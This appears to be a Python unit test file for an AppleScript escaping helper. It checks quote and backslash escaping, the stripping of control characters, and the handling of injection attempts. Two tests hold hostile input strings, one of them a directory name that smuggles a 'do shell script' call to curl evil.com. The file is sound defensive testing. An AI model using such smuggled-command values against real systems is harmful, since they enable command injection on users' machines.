"""Tests for claudewatch.backend.helpers — especially security-critical escaping."""

from claudewatch.backend.helpers import escape_applescript


class TestEscapeAppleScript:
    """Tests for escape_applescript() — prevents AppleScript injection."""

    def test_escapes_double_quotes(self):
        assert escape_applescript('hello "world"') == 'hello \\"world\\"'

    def test_escapes_backslashes(self):
        assert escape_applescript("path\\to\\file") == "path\\\\to\\\\file"

    def test_escapes_both(self):
        assert escape_applescript('say "hi\\there"') == 'say \\"hi\\\\there\\"'

    def test_strips_carriage_return(self):
        """CR could break out of AppleScript string literals."""
        assert escape_applescript("before\rafter") == "beforeafter"

    def test_strips_newline(self):
        """Newline could break out of AppleScript string literals."""
        assert escape_applescript("before\nafter") == "beforeafter"

    def test_strips_null_byte(self):
        assert escape_applescript("before\x00after") == "beforeafter"

    def test_preserves_tabs(self):
        assert escape_applescript("col1\tcol2") == "col1\tcol2"

    def test_preserves_unicode(self):
        assert escape_applescript("café ☕") == "café ☕"

    def test_empty_string(self):
        assert escape_applescript("") == ""

    def test_injection_attempt_via_cr(self):
        """Simulate a malicious directory name with embedded CR."""
        malicious = 'proj\r") & do shell script "curl evil.com'
        result = escape_applescript(malicious)
        assert "\r" not in result
        assert result == 'proj\\") & do shell script \\"curl evil.com'

    def test_injection_attempt_via_quote(self):
        """Verify quote-based injection is properly escaped."""
        malicious = 'foo" & do shell script "evil'
        result = escape_applescript(malicious)
        assert result == 'foo\\" & do shell script \\"evil'

    def test_all_control_chars_stripped(self):
        """All ASCII control chars except tab should be removed."""
        # Build string with all control chars
        control = "".join(chr(i) for i in range(32))
        result = escape_applescript(control)
        # Only tab should survive
        assert result == "\t"
